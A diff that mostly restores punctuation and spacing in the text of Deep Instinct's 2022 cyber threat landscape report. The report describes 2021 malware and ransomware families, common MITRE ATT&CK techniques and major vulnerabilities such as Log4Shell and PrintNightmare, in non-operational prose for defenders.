@@ -3,11 +3,11 @@ Cyber Threat
 Landscape Report
 2022
 Includes
-The Top Malware Trends
-The Top 5 Ransomware Families
-The Top 10 MITRE Techniques and Capabilities
-High Profile Vulnerabilities
-2022 Predictions
+ The Top Malware Trends
+ The Top 5 Ransomware Families
+ The Top 10 MITRE Techniques and Capabilities
+ High Profile Vulnerabilities
+ 2022 Predictions
 02
 CYBER THREAT LANDSCAPE REPORT 2022
 Table of Contents
@@ -23,7 +23,11 @@ The Top 10: MITRE techniques and capabilities
 High profile vulnerabilities in 2021
 Interesting trends and campaigns in 2021 
 Malware Trends by Campaign 
-Excel 4\.0 MacrosJavaScriptAttacks on Microsoft Exchange Servers
+Excel 4\.0 Macros 
+ 
+JavaScript
+ 
+Attacks on Microsoft Exchange Servers
 Deep Instinct discoveries in 2021
 The New Normal: Post COVID\-19 and the hybrid workplace
 Cyber Insights: A Look Back at Our 2021 Predictions
@@ -71,7 +75,9 @@ About Deep Instinct
 31
 03
 CYBER THREAT LANDSCAPE REPORT 2022
-Welcome to our annual review of the most significant cyber threats and 
+W 
+ 
+  elcome to our annual review of the most significant cyber threats and 
 trends from 2021\. While there were continuations of trend lines that have 
 been mainstays of the threat landscape for the past few years, there were 
 also some unexpected developments that warrant mention. The increase in the highest 
@@ -80,14 +86,14 @@ of the COVID\-19 outbreak in spring 2020, although it still recorded double digi
 growth. Specific attack vectors have grown substantially, such as the use of Office 
 droppers (up 170%), along with an overall uptick of 125% in all threat types combined. 
 Overall, the volume of all malware types is still substantially higher than during the pre\-
-pandemic period.
+pandemic period. 
 The attacks themselves are also changing as we are now witnessing some groups 
 opting to inflict the maximum impact over a shorter time span. In these shorter\-
 duration attacks, the goal is to damage data (its confidentiality and availability), 
 destabilize a business, and impair business continuity. High profile breaches within 
-critical infrastructures such as the one experienced by Colonial Pipeline can have 
+critical infrastructures — such as the one experienced by Colonial Pipeline — can have 
 huge consequences for millions of consumers. The energy sector is experiencing more 
-of these attacks because the instant pain inflicted can speed the payment of ransom 
+of these attacks because the instant pain inflicted can speed the payment of ransom — 
 the ultimate goal of any ransomware attack. While attacks that rely on dwell time and 
 stealth are certainly a major hazard for cyber professionals, shorter duration attacks 
 are gaining favor.
@@ -95,30 +101,31 @@ The ongoing transition of many organizations to a work\-from\-anywhere or hybrid
 model has broadened and multiplied attack surfaces, in the process rendering defenses 
 less active. Additionally, the continued move to cloud applications has reduced costs, 
 but also surfaced several inherent dangers to business leaders.
-Modular campaigns have been a feature of 2021, highlighted by spywareransomware 
-combinations and multicross\-OS attacks. We have seen a clear relationship between 
+Modular campaigns have been a feature of 2021, highlighted by spyware/ransomware 
+combinations and multi/cross\-OS attacks. We have seen a clear relationship between 
 Emotet and TrickBot operators, with infected TrickBot machines being used to 
 download the new Emotet binary. More thought is going into certain attack methods 
 with a rise in multi\-stage custom\-built packers and encryptors evident. As a result, 
 adopting a multi\-layered protection mindset becomes even more critical.
 Supply\-chain attacks have been an ongoing topic as well. In July 2021, in one of the 
-years greatest supply\-chain attacks, REvil infected Kaseya VSA and then infiltrated the 
-companys VSA clients environments. REvil took advantage of a then\-unpatched zero\-
-day vulnerability in the Kaseya VSA product. More than 1,500 companies using Kaseyas 
+year’s greatest supply\-chain attacks, REvil infected Kaseya VSA and then infiltrated the 
+company’s VSA clients’ environments. REvil took advantage of a then\-unpatched zero\-
+day vulnerability in the Kaseya VSA product. More than 1,500 companies using Kaseya’s 
 services were ultimately infected with REvil. 
 The HAFNIUM group, which targeted Exchange servers shortly after Microsoft revealed 
 multiple zero\-day vulnerabilities, was behind the single biggest threat of the year. This 
 attack underscored why major vulnerabilities are being exploited and used within hours 
 of disclosing the vulnerability. The race between patching vulnerable systems versus an 
-attackers ability to create a single\-day exploit will continue to be a significant trend in 
-1\. Overall, while 2021 was not marked with exponential increases in attack volumes, 
+attacker’s ability to create a single\-day exploit will continue to be a significant trend in 
+2022\.
+Overall, while 2021 was not marked with exponential increases in attack volumes, 
 attacks became increasingly advanced. Attackers turned to more sophisticated 
 evasion techniques that worked by fooling or bypassing detection tools. Defense 
 evasion and privilege escalation are becoming more prevalent, and we expect to 
-see a continuation of EPPEDR evasion techniques in 2022\. Bad actors are clearly 
+see a continuation of EPP/EDR evasion techniques in 2022\. Bad actors are clearly 
 investing in anti\-AI and adversarial attack techniques and integrating these methods 
 into their larger evasion strategy.
-This report represents Deep Instincts current view of the threat landscape, 
+This report represents Deep Instinct’s current view of the threat landscape, 
 showcasing trends seen throughout the course of the past year and providing 
 concrete, actionable data to verify the credibility of these developments. The 
 information was sourced from our data repositories, which are routinely analysed 
@@ -126,28 +133,30 @@ as part of protecting our customers from ceaseless attacks. We hope this report
 will provide you with a better understanding of the present threat landscape and its 
 future trajectory.
 Executive Summary
-Best regards,Shimon N. Oren
+Best regards,
+
+Shimon N. Oren
 VP of Research and Deep Learning
 04
 CYBER THREAT LANDSCAPE REPORT 2022
 D 
-eep Instinct is pleased to release its 2021 Threat 
+  eep Instinct is pleased to release its 2021 Threat 
 Landscape Report. The information presented in 
-this report is based on D\-cloud, Deep Instincts 
+this report is based on D\-cloud, Deep Instinct’s 
 proprietary file reputation database. The database receives 
 data from multiple feeds including well\-known threat 
 intelligence providers, curated sources maintained by Deep 
-Instincts research group, and production data from Deep 
-Instincts customer base. This wide cumulation of datasets 
+Instinct’s research group, and production data from Deep 
+Instinct’s customer base. This wide cumulation of datasets 
 is reflective of hundreds of millions of events that occurred 
 in 2021\.
 The proprietary database provides real\-time information 
-on threats for the purpose of supporting Deep Instincts 
+on threats for the purpose of supporting Deep Instinct’s 
 research efforts and to help ensure optimal security of our 
 customers. The analysis in this research study considers 
 hundreds of millions of attempted attacks that occurred every 
 day throughout 2021 within our customer environments. 
-This information was gathered by Deep Instincts team of 
+This information was gathered by Deep Instinct’s team of 
 researchers who have decades of combined experience and are 
 veterans of various cyber intelligence units in the Israel Defense 
 Forces. They extrapolated these findings to predict the future 
@@ -164,11 +173,11 @@ Top Takeaways
 While supply chain attacks are certainly not new, they were leveraged with greater 
 regularity in 2021\. A variety of large service offering companies became targets 
 with threat actors intending to not only gain access to their environments, but the 
-environments of their customers by proxy. hit in early July 2021 by the REvil 
+environments of their customers by proxy. — hit in early July 2021 by the REvil 
 ransomware using a then\-unpatched zero\-day vulnerability in the Kaseya VSA product. As 
 a result, more than 1,500 companies were infected with REvil. Given the success of these 
-attacks and the efficiency of one attack opening thousands more for compromise, were 
-likely to see many similar attacks moving ahead.
+attacks and the efficiency of one attack opening thousands more for compromise, we’re 
+likely to see many similar attacks moving ahead. 
 As we have predicted, there was greater partnership among international task forces this 
 past year to identify and bring to justice key threat actors around the world. High\-profile 
 targets, including Emotet and REvil, were taken down by joint teams of law enforcement 
@@ -184,7 +193,7 @@ and they are harvesting data or abusing servers for cryptomining as long as they
 seeing more high\-impact attacks on critical infrastructures across all sectors in recent 
 years, but nothing seems to compare to the Colonial Pipeline breach in terms of scope. 
 This attack, which caused Colonial Pipeline to halt their operations for six days, caused 
-major disruptions across the U.S a shortage of fuel, and a subsequent increase in gas 
+major disruptions across the U.S., a shortage of fuel, and a subsequent increase in gas 
 prices. Not only did this incident demonstrate the significant and cascading impact of a 
 well\-executed malware attack, but it also emphasized the importance of having sufficient 
 cybersecurity defense mechanisms to protect critical infrastructure. 
@@ -206,7 +215,7 @@ vulnerability is disclosed and patched to the time an organization can patch all
 relevant components. In 2021, we saw major vulnerabilities being exploited and 
 used within a single day of disclosing the vulnerability. One of the examples is the 
 HAFNIUM group which surfaced shortly after Microsoft revealed multiple zero\-day 
-vulnerabilities. The race between patching vulnerable systems versus attackers 
+vulnerabilities. The race between patching vulnerable systems versus attacker’s 
 ability to create a zero\-day exploit will continue in 2022\. 
 The transition to work\-from\-anywhere has sped digital transformation efforts for many 
 organizations, inducing them to move most of their services to the cloud rather than 
@@ -215,7 +224,7 @@ organizations, the transition to the cloud brings a plethora of business opportu
 it also comes with many cyber security challenges and risks. For organizations that are 
 not experienced working with cloud services there is the risk that misconfigurations or 
 vulnerable, out\-of\-date components with external API access can be exploited. 
-During 2021 we saw many high\-profile vulnerabilities every few months, with publicly
+During 2021 we saw many high\-profile vulnerabilities every few months, with publicly 
 available exploit POCs. Securing the entire on\-premises network is not enough anymore, 
 as a single outdated cloud component can create a gateway for attackers to breach an 
 entire organization. 
@@ -280,7 +289,7 @@ This malware usually spreads via mass email campaigns. Dridex uses malicious ema
 attachments that include either a Word document containing a malicious macro, or a 
 PDF that utilizes malicious JavaScript. Following successful infection, Dridex will collect 
 and deliver banking information, credit card data, credentials, and additional sensitive 
-data found on the victims computer to its C\&C servers. Other variants include a crypto\-
+data found on the victims’ computer to its C\&C servers. Other variants include a crypto\-
 currency wallet credential stealing mechanism. 
 In several instances, the Dridex infection infrastructure has also been used to spread 
 other financial malware and spyware such as TrickBot and Emotet, sharing the same 
@@ -292,7 +301,7 @@ downloads a malicious PE file (Emotet) which is then executed. Once executed, it
 intercept and log network traffic, inject into browsers, and access banking sites in order 
 to exfiltrate and store financial data. 
 In 2017, Emotet operators redesigned the trojan to work mainly as a Dropper, a type of 
-malware that is designed to deliver other malware to a victims computer. Other players 
+malware that is designed to deliver other malware to a victim’s computer. Other players 
 in the cybercrime world, such as TrickBot banking malware and Ryuk ransomware, utilize 
 Emotet Dropper capabilities to infect countless other users. 
 01
@@ -302,7 +311,7 @@ Emotet
 TOP 5: Malware 
 Families
 The top 5 malware families of 2021\. The number of samples 
-were collected from Deep Instincts D\-Cloud platform. 
+were collected from Deep Instinct’s D\-Cloud platform. 
 58%
 10%
 13%
@@ -319,8 +328,8 @@ is a spyware that has been sold online since 2014\. It
 is advertised as a legitimate monitoring software not 
 intended for malicious purposes. However, its password 
 extraction functionality and features that are aimed at 
-avoiding detection allow Agent Teslas operators to use it 
-for malicious purposes. Agent Teslas support team have 
+avoiding detection allow Agent Tesla’s operators to use it 
+for malicious purposes. Agent Tesla’s support team have 
 been assisting users with instructions on how to infect 
 targets similar to how malware is deployed in the wild. 
 is a sophisticated banking malware that targets individuals, 
@@ -339,21 +348,21 @@ rate and operate a range of attack techniques. Due to
 its architecture, TrickBot has had several capabilities: In 
 addition to credential stealing, it could be either operating as 
 a backdoor, having network spreading abilities, utilizing email 
-harvesting features, or anyall of the above. In some cases, 
+harvesting features, or any/all of the above. In some cases, 
 TrickBot has delivered a ransomware\-like screen lock option 
 meant to steal system passwords. 
 is a modular banking trojan active in the past few 
 years, mainly targeting businesses in the U.S. and the 
 UK. It primarily targets the financial industry, aiming to 
 attack banks, credit card companies, and e\-commerce 
-properties.
+properties. 
 IcedID is distributed mostly as a secondary payload 
 of Emotet, another highly active banking trojan. Once 
 executed, it has worm\-like abilities that allow it to 
 propagate to additional machines on a network and 
 leverages simple evasion techniques that include only 
 operating after the machine restarts. 
-IcedID manipulates the victims browsers to display 
+IcedID manipulates the victims’ browsers to display 
 a correct URL address with a valid SSL in banking 
 websites, while actually redirecting the traffic to a fake 
 website where it aims to steal credentials. 
@@ -370,12 +379,12 @@ dangerous and dominant malware families in the wild.
 In early 2021, an international taskforce coordinated 
 by Europol and Eurojust seized Emotet infrastructure, 
 comprised of several hundred servers located around the 
-world, and arrested some of its operators.
+world, and arrested some of its operators. 
 Additionally, in April 2021, law enforcement used the Emotet 
 infrastructure to automatically uninstall the malware from 
 infected systems. These actions stopped Emotet operations 
 for a period, but in November 2021 new variants of Emotet 
-were again spotted in the wild.
+were again spotted in the wild. 
 There is a clear relationship between Emotet and TrickBot 
 operators, as evidenced by infected TrickBot machines being 
 used to download the new Emotet binary. 
@@ -386,29 +395,29 @@ capability (Excel 4\.0\), to execute the malicious macro.
 This spyware is capable of extracting credentials from 
 browsers, email, and FTP clients. Additionally, Agent Tesla 
 can collect data from clipboard and webforms, grab 
-screenshots, and record video from a users computer, 
+screenshots, and record video from a user’s computer, 
 allowing for the manipulation of system components. 
 10
 CYBER THREAT LANDSCAPE REPORT 2022
 TOP 5: Ransomware 
 Families
 is a ransomware family discovered in December 2018\. It 
-encrypts files on a victims machine using the AES\-256 
+encrypts files on a victim’s machine using the AES\-256 
 encryption algorithm, while other algorithms have also been 
 seen in newer variants. Its encryption of files is only partial 
- just the first 5 MB of data is encrypted per file. STOP is 
+– just the first 5 MB of data is encrypted per file. STOP is 
 focused on specific file types based on their file extension 
 and includes PDFs, Microsoft Office documents, databases, 
 photos, music, videos, archives, and applications. The 
 encrypted files are appended with various file extensions 
 that sometimes differ per STOP variant. Typically, the 
-affected files will have the following file extensions: .STOP, 
-.SUSPENDING, .DATASTOP, .djvu, .djvuq, and a 
+affected files will have the following file extensions: “.STOP,” 
+“.SUSPENDING,” “.DATASTOP,” “.djvu,” “.djvuq,” and a 
 variety of others. Following encryption, a ransom note is 
 presented to victims typically demanding $980 USD in BTC 
 to decrypt the files. 
 also known as Sodinokibi, is a ransomware which first 
-appeared in the wild in April 2019 just prior to the 
+appeared in the wild in April 2019 — just prior to the 
 conclusion of operations of Gandcrab ransomware. This 
 malware has since been utilized in several high\-profile 
 targeted attacks against private companies and government 
@@ -431,7 +440,7 @@ Cerber
 REvil
 Conti
 DarkSide
-The top 5 ransomware families in 2021 based on data from Deep Instincts D\-Cloud. The numbers 
+The top 5 ransomware families in 2021 based on data from Deep Instinct’s D\-Cloud. The numbers 
 are shown in arbitrary units, where the number of DarkSide samples is represented by one. 
 20
 40
@@ -446,7 +455,7 @@ early 2017, Cerber accounted for more than 25% of all
 ransomware infections. Cerber infects users globally, 
 though it spares users located in former USSR countries 
 (or users which have a former Soviet bloc language as the 
-default on their computer).
+default on their computer). 
 Cerber had a very popular Ransomware\-as\-a Service 
 (RaaS) program and has been distributed through 
 affiliates that profited handsomely through successful 
@@ -468,19 +477,19 @@ organization.
 which first appeared in August 2020, is a ransomware that 
 mostly targets organizations in English\-speaking countries. 
 The threat group behind the malware markets it as a RaaS 
-and has an affiliates program that gives its members 
+and has an “affiliates program” that gives its members 
 access to the ransomware in exchange for a stake of the 
-ransom payment. Affiliates must also abide the gangs 
+ransom payment. Affiliates must also abide the gang’s 
 code of conduct: specifically, they must avoid attacking 
 organizations from several sectors, such as healthcare and 
 education. 
 Once the attackers successfully breach a corporate 
 network, they determine whether harming the 
 organization conflicts with the above\-mentioned code of 
-conduct and only if it doesnt will the attack continue.
+conduct and only if it doesn’t will the attack continue.
 In the next stage, several sensitive artifacts are exfiltrated 
 and PowerShell is used to download the DarkSide 
-payload, update.exe, to several locations on the victims 
+payload, “update.exe,” to several locations on the victim’s 
 computer, including a network share created by the 
 attackers. After patient zero is fully infected, the threat 
 03
@@ -494,7 +503,7 @@ cybercrime group Wizard Spider and is spread using
 exploits for vulnerable firewalls, through mass phishing 
 email campaigns, or as a secondary payload of TrickBot. 
 Conti encrypts all files except PE files, system files, and 
-shortcuts in the victims local storage or remote SMB 
+shortcuts in the victims’ local storage or remote SMB 
 networks. It can also exfiltrate sensitive data and stored 
 credentials to be used in its double\-extortion practice.
 The operator threatens to publish stolen information on a 
@@ -502,15 +511,15 @@ designated data leaks site if the victims are reluctant to pay.
 actors move laterally in the environment with the goal of 
 reaching the Domain Controller (DC). If they succeed, they 
 exfiltrate sensitive information, such as files and the SAM 
-registry hive. They copy update.exe from the previously 
+registry hive. They copy “update.exe” from the previously 
 created network share into the DC, use Task Scheduler to 
 set an execution time, and copy the ransomware payload 
 to yet another network share, which this time resides on 
 the DC and is used to transfer the ransomware to other 
-targets in the environment for maximum damage.
- When the payload is executed, it compares the systems 
-language to a set of former Soviet Bloc countries 
-languages to make sure it doesnt run in one of these 
+targets in the environment for maximum damage. 
+ When the payload is executed, it compares the system’s 
+language to a set of former Soviet Bloc countries’ 
+languages to make sure it doesn’t run in one of these 
 nations. If it finds it may run in a country that is off limits 
 the ransomware disables certain security and backup 
 services, connects to its C2 server, disables the Volume 
@@ -519,22 +528,22 @@ using PowerShell.
 DarkSide generates a unique user ID string for each victim 
 and uses it as a file extension for the encrypted files. It 
 also changes the icons and the desktop background and 
-drops a readme.txt file with ransom demands.
+drops a “readme.txt” file with ransom demands. 
 In March 2021, DarkSide released version 2\.0, which was 
-claimed as the fastest Ransomware\-as\-a\-Service ever 
-seen and has both Windows and Linux variants. The 
+claimed as the “fastest Ransomware\-as\-a\-Service ever 
+seen” and has both Windows and Linux variants. The 
 Linux variants can exploit VMware ESXi vulnerabilities and 
 harm Network Attach Storage (NAS) devices. 
 In June 2021, DarkSide was used to attack the Colonial 
 Pipeline resulting in a major disruption in the critical 
-infrastructures operation. Shortly after the attack, the 
+infrastructure’s operation. Shortly after the attack, the 
 DarkSide website was taken down by the U.S. government. 
 Fearing further retaliation, the threat actors behind the 
 ransomware, who are believed to be from a former Soviet 
-nation, shut down their operations.
+nation, shut down their operations. 
 12
 CYBER THREAT LANDSCAPE REPORT 2022
-TOP 5: Linux
+TOP 5: Linux 
 Malware Families
 was first seen in 2014 and has been building its army of 
 botnets for the last eight years. The malware spreads by 
@@ -555,12 +564,12 @@ related to the Winnti APT group.
 is an infamous botnet that has been operating since 2016\. 
 It was responsible for some of the most disruptive DDoS 
 attacks in the world, including the attacks against Dyn, then 
-one of the largest DNS operators in the world, Brian Krebs 
+one of the largest DNS operators in the world, Brian Krebs’ 
 website, and the French web\-hosting service OVH. 
 Mirai targets Linux\-powered devices with a focus on IoT 
 connected routers, CCTV\-DVRs, smart TVs, NAS devices, 
 and other connected machines. Once infected, it turns 
-these devices into bot slaves used in its large\-scale 
+these devices into bot “slaves” used in its large\-scale 
 DDoS and click fraud attacks. Mirai spreads by scanning 
 the internet and local networks for vulnerable internet\-
 connected products that can be exploited or brute forced. 
@@ -584,7 +593,7 @@ Tsunami
 Hajine
 13
 CYBER THREAT LANDSCAPE REPORT 2022
-Mirais code has been public since the end of 2016 when 
+Mirai’s code has been public since the end of 2016 when 
 it was released by its author. Different variants of the 
 malware have emerged since, including Satori, Okiru, 
 Miori, and Moobot, just to name a few. 
@@ -615,11 +624,11 @@ exploitation of vulnerabilities in IoT devices.
 Gafgyt made a name for itself in 2014 when the malware 
 was spotted exploiting a Shellshock vulnerability in order 
 to infect devices running the software suite BusyBox. 
-Like Mirai, Gafgyts code was leaked in 2015, resulting in 
+Like Mirai, Gafgyt’s code was leaked in 2015, resulting in 
 different variants of the malware being created. Some 
 variants have been found to also include code from Mirai. 
-This year, Gafgyt was spotted delivering the Simps 
-botnet which used Gafgyts DDoS module for its attacks 
+This year, Gafgyt was spotted delivering the “Simps” 
+botnet which used Gafgyt’s DDoS module for its attacks 
 on gaming targets. 
 was discovered in October 2016 while researching Mirai. 
 It utilizes a peer\-to\-peer decentralized network for its 
@@ -628,26 +637,26 @@ or sinkhole its command\-and\-control server. Initially,
 Hajime gains access to a vulnerable system by means of 
 brute force, while making use of a dictionary of known 
 username and password pairs. Then, it gains persistence 
-with an rc.d script that gets executed on boot.
+with an rc.d script that gets executed on boot. 
 Next, the worm will download configuration files shared 
 with other clients in the botnet and block network 
 ports that are usually associated with Hajime and other 
 botnet infections, blocking any further infections. The 
 last step is particularly interesting, combined with the 
-fact that in addition to firewall changes, Hajime doesnt 
-appear to be involved in any malicious activity. It doesnt 
+fact that in addition to firewall changes, Hajime doesn’t 
+appear to be involved in any malicious activity. It doesn’t 
 initiate DDoS attacks, drop other malware, or operate 
 a protection racket like its cousins, Mirai and Gafgyt. 
 Following a successful infection, the malware leaves the 
 following message on the compromised device: 
-Just a white hat, securing some systems. Important 
+“Just a white hat, securing some systems. Important 
 messages will be signed like this! Hajime Author. Contact 
-CLOSED Stay sharp! 
+CLOSED Stay sharp!” 
 To add insult to injury, this message makes Hajime look 
-like its trying to secure the device its infecting. 
+like it’s trying to secure the device it’s “infecting.” 
 14
 CYBER THREAT LANDSCAPE REPORT 2022
-TOP 5: Financial
+TOP 5: Financial 
 Malware Families
 TOP Family per Month
 20
@@ -705,12 +714,12 @@ a PDF that utilizes a malicious JavaScript.
 Following successful infection, Dridex will 
 collect and deliver banking information, credit 
 card data, credentials, and additional sensitive 
-data found on the victims computer to its 
+data found on the victims’ computer to its’ 
 C\&C servers. Other variants include a crypto\-
 currency wallet credential stealing mechanism. 
 On several occasions the Dridex infection 
 infrastructure has also been used to spread 
-other financial malwarespyware such as 
+other financial malware/spyware such as 
 TrickBot and Emotet, sharing the same droppers 
 or dropping each other as a secondary payload.
 is a sophisticated banking malware that targets 
@@ -751,8 +760,8 @@ will be delivered along with other malware
 such as Ryuk ransomware. Zloader droppers 
 use various infection vectors and techniques 
 such as Excel4 macros and password protected 
-documents in order to infect a system.
-Zloader also utilizes different techniques its 
+documents in order to infect a system. 
+Zloader also utilizes different techniques — its 
 main modules are web injections, form grabbing, 
 keylogging, and anti\-analysis mechanisms to steal 
 credentials and other private information from 
@@ -775,11 +784,11 @@ steal credentials. Additionally, QakBot collects
 further information from the infected machine 
 including IP address, country of origin, cookies, 
 and other system information. 
-QakBots distribution methods vary and include 
+QakBot’s distribution methods vary and include 
 malspam with specially crafted document 
 attachments triggering the infection, or exploit 
 kits deployed on compromised websites that 
-deliver QakBots payload to websites visitors. 
+deliver QakBot’s payload to website’s visitors. 
 03
 IcedID
 is a modular banking trojan that has been 
@@ -787,7 +796,7 @@ active for the past few years, mainly targeting
 businesses in the U.S. and the UK. It primarily 
 targets the financial industry, aiming to attack 
 banks, credit card companies, and e\-commerce 
-properties.
+properties. 
 IcedID is distributed mostly as a secondary 
 payload of Emotet, another highly active banking 
 trojan. Once executed, it has worm\-like abilities 
@@ -795,18 +804,18 @@ that allow it to propagate to additional machines
 on a network, as well as employ simple evasion 
 techniques such as only operating after the 
 machine restarts.
-IcedID manipulates the victims browser to 
+IcedID manipulates the victims’ browser to 
 display a correct URL address with a valid SSL 
 in banking websites, while actually redirecting 
 the traffic to a fake website aimed to steal 
 credentials. 
 17
 CYBER THREAT LANDSCAPE REPORT 2022
-THE TOP 10: MITRE
+THE TOP 10: MITRE 
 techniques and capabilities 
-MITRE ATT\&CK is an industry standard framework formed as a knowledge base of known attacker behaviors that have 
+MITRE ATT\&CK® is an industry standard framework formed as a knowledge base of known attacker behaviors that have 
 been compiled into tactics and techniques observed in real\-world scenarios. It is intended to reflect the various phases of 
-an adversarys attack lifecycle. 
+an adversary’s attack lifecycle. 
 Based on D\-Cloud events, we managed to extract the most common techniques among some of the tactics. 
 01
 02
@@ -815,33 +824,33 @@ Execution
 Persistence 
 Privilege Escalation 
 Command and Scripting Interpreter 
-\[TA0002\.T1059]
+\[TA0002\.T1059] 
 Most operating systems come with a built\-in command line 
 interface and scripting capabilities which allow us to interact 
-with different applications and system commands.
+with different applications and system commands. 
 An adversary may abuse programming languages such 
-as JavaScript or Visual Basic to gain access to a victims 
+as JavaScript or Visual Basic to gain access to a victim’s 
 computer and execute various commands to exfiltrate data 
-or even download additional malware.
+or even download additional malware. 
 Boot or Logon AutoStart Execution 
-\[TA0004\.T1574]
-Some malware requires a steady foothold over the victims 
+\[TA0004\.T1574] 
+Some malware requires a steady foothold over the victim’s 
 machine to achieve its intended goals. We see this method 
 used most regularly in miners and spyware, both of which 
 survive booting of the operating systems. 
 Most malware is still employing basic techniques like 
 using different registry keys and startup folders that most 
 legitimate applications are using to gain persistence. We 
-still see this technique being use and being successful 
+still see this technique being use – and being successful – 
 because it is both easy to use and difficult to differentiate 
 between legitimate and malicious use. 
 Hijack Execution Flow 
-\[TA0003\.T1547]
+\[TA0003\.T1547] 
 We have seen attackers use a multitude of ways to hijack the 
 execution flow of operating systems. This can be done by 
-modifying or replacing file systems with malicious content.
+modifying or replacing file systems with malicious content. 
 Using this method, attackers can gain high privileges to 
-gain access to sensitive components in an organizations 
+gain access to sensitive components in an organization’s 
 network. 
 READ MORE
 READ MORE
@@ -860,18 +869,18 @@ Lateral
 Movement 
 Obfuscated Files or Information: 
 Software Packing 
-\[TA0005\.T1027\.002]
+\[TA0005\.T1027\.002] 
 Software packing is a method of 
 compressing or encrypting an executable. 
 Packed files tend to be more difficult to 
 analyze by researchers and are often able 
-to avoid signature\-based detection.
-With that in mind, its not surprising that 
+to avoid signature\-based detection. 
+With that in mind, it’s not surprising that 
 software packing is the most common 
 defense evasion technique used by 
 malware today. 
 OS Credential Dumping 
-\[TA0006\.T1003]
+\[TA0006\.T1003] 
 There are many ways to harvest credentials 
 from the OS, which makes it a very 
 common technique among attackers. 
@@ -880,8 +889,8 @@ available tools like Mimikatz, while others
 might use proprietary tools they have 
 developed in order to avoid reputation 
 detection. 
-VirtualizationSandbox Evasion 
-\[TA0007\.T1497]
+Virtualization/Sandbox Evasion 
+\[TA0007\.T1497] 
 Security researchers and AV solutions 
 often use an isolated testing environment 
 to analyze malicious software. 
@@ -893,7 +902,7 @@ legitimate user activity, which may suggest
 the presence of a testing environment and 
 the use of sleep timers or loops within the 
 code to avoid operating within a temporary 
-sandbox.
+sandbox. 
 Remote Services
  \[TA0008\.T1021] 
 An adversary will prefer the use of 
@@ -902,8 +911,8 @@ new machines once they are already inside
 the network. 
 The reason this technique is so common is 
 because an attacker can abuse applications 
-which are already installed on the victims 
-machine and used daily.
+which are already installed on the victim’s 
+machine and used daily. 
 READ MORE
 READ MORE
 READ MORE
@@ -917,29 +926,29 @@ Collection
 Exfiltration 
 Impact 
 Input Capture 
-\[TA0009\.T1056]
+\[TA0009\.T1056] 
 Users often provide credentials to different applications 
 in their day\-to\-day use of browsers, an email client, mobile 
-login pages, and so on.
+login pages, and so on. 
 An attacker may utilize different methods of capturing user 
 input to collect credentials. These methods may involve 
 the use of fake apps or website phishing, keylogging user 
 input, or latching onto system processes to retrieve further 
-information.
+information. 
 Exfiltration Over Web Service 
-\[Ta0010\.T1567]
-Over the last few years, weve seen adversaries advancing 
+\[Ta0010\.T1567] 
+Over the last few years, we’ve seen adversaries advancing 
 from temporary C2 domains to legitimate known domains 
-like Discord and other social media services.
+like Discord and other social media services. 
 This gives the attacker the ability to exfiltrate a machine 
-using applications that have network traffic which wont be 
+using applications that have network traffic which won’t be 
 blocked by firewall solutions. 
 Tactic
 Technique
 Sub\-Technique
-searchDefence Evasion (TA0005\)searchExecution (TA0002\)
-searchSubvert Trust Controls (T1553\)searchUser Execution (T1204\)
-searchCode Signing (T1553\.002\)searchMalicious File (T1204\.002\)
+search Defence Evasion (TA0005\) search Execution (TA0002\)
+search Subvert Trust Controls (T1553\) search User Execution (T1204\)
+search Code Signing (T1553\.002\) search Malicious File (T1204\.002\)
 Data Encrypted for Impact 
 \[TA0040\.T1486] 
 In 2021, we observed major ransomware impacts in 
@@ -965,31 +974,31 @@ used by threat actors to gain persistence on unpatched Microsoft Exchange server
 By utilizing these techniques, an attacker could deploy a webshell into a vulnerable 
 Exchange server, which would allow remote execution of code on the server, the ability 
 to deploy and execute additional malware, and access to execute malware on other 
-machines in the servers domain. In some instances, attackers attempted to make the 
+machines in the server’s domain. In some instances, attackers attempted to make the 
 deployed webshell accessible from other Exchange servers in the affected domain. 
 an ongoing issue in the Windows print Spooler service, was first seen during the 
 early summer of 2021\. Two different vulnerabilities were discovered over the course 
 of two months: 
-a.CVE\-2021\-1675
-b.CVE\-2021\-34527
+ a. CVE\-2021\-1675 
+ b. CVE\-2021\-34527 
 While the first vulnerability was merely a local privilege escalation, the second 
 vulnerability had a relatively high CVSS score of 8\.8 and had a stronger attack vector 
 of remote code execution. 
 Researchers published different POCs and a series of ways to bypass the patches 
-in scenarios where there were specific system configurations (e.g specific Group 
+in scenarios where there were specific system configurations (e.g., specific Group 
 Policy). 
 Eventually, Microsoft updated both vulnerabilities as remote code execution and 
 issued a very detailed mitigation guide covering all possible scenarios. Security 
 researchers will keep finding flaws in widely used products. While these exploit kits 
-are providing attackers entrance into organizations environments, securing the 
+are providing attackers entrance into organization’s environments, securing the 
 endpoints in an organization is a necessary proactive solution to avoid dangerous 
 payloads that may arrive as a second stage in the infection chain.
 ProxyShell
 PrintNightmare
-a new and extremely severe vulnerability was discovered in Apaches logging framework, 
+a new and extremely severe vulnerability was discovered in Apache’s logging framework, 
 Log4j2, was first spotted in late 2021\. The Log4Shell vulnerability allowed an attacker 
 to remotely execute a command on a vulnerable server simply by encapsulating it in 
-brackets and putting it in the user\-agent header of an HTTP request. The simplicity of 
+brackets and putting it in the ‘user\-agent’ header of an HTTP request. The simplicity of 
 the exploitation, combined with the popularity of the logging framework, made Log4Shell 
 extremely severe, earning it a CVSS (Common Vulnerability Scoring System) score of 10\.0, 
 the highest a vulnerability can get. We explored the vulnerability in detail here. 
@@ -997,13 +1006,13 @@ Log4Shell
 21
 CYBER THREAT LANDSCAPE REPORT 2022
 Interesting trends 
-and campaigns
-in 2021
+and campaigns 
+in 2021 
 Threat actors have made a discernable shift away from older programming 
 languages, such as C and C\+\+, in favor of newer languages, such as Python 
 and Go. Not only are these newer languages easier to program in than their 
 predecessors, they also are less common and less likely to be analyzed by 
-security researchers and less likely to be detected by cybersecurity tools. 
+security researchers — and less likely to be detected by cybersecurity tools. 
 As its name suggests, RedLine Stealer is an information stealer. It was first 
 spotted in 2020 and in its earlier versions the malware was marketed as a MaaS 
 (Malware\-as\-a\-Service) that allowed its owner to harvest Windows credentials, 
@@ -1012,7 +1021,7 @@ RedLine added a few tools to its utility belt and can now also run commands on
 infected systems, deploy and execute additional malware, monitor the system for 
 new potentially interesting information, and send the found data to its C2 server, 
 making it considerably more dangerous. This malware can be purchased directly 
-through RedLines Telegram channel, making it very accessible and leaving any 
+through RedLine’s Telegram channel, making it very accessible and leaving any 
 organization without adequate malware defenses subject to future attack and 
 exploitation. 
 GuLoader bust onto the scene as a new dropper that abuses legitimate cloud 
@@ -1024,7 +1033,9 @@ malware is used as a second or third stage payload after an attacker has gained
 initial access to the victims. Eventually, these malware payloads are dropped from 
